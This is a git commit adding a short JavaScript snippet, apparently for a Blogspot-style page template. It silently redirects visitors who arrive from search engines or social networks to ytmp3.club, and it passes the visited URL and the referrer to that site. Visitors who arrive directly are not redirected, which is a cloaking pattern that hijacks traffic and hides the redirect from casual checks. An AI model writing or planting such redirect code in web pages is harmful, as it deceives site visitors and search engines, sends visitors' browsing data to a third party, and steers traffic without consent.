5895feb15ba0407fd01955a3b1fedf727739e512
sandiutama9 <117800065+sandiutama9@users.noreply.github.com>
2022-11-09 13:28:53 +0800

    Add files via upload

---
+++ arsaeytmp3.js
@@ -0,0 +1,8 @@
+<script>
+  //<![CDATA[
+var ars = 'https://www.ytmp3.club';
+
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'blogspot.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+//]]>
+</script>
+<!--ads/auto.txt-->
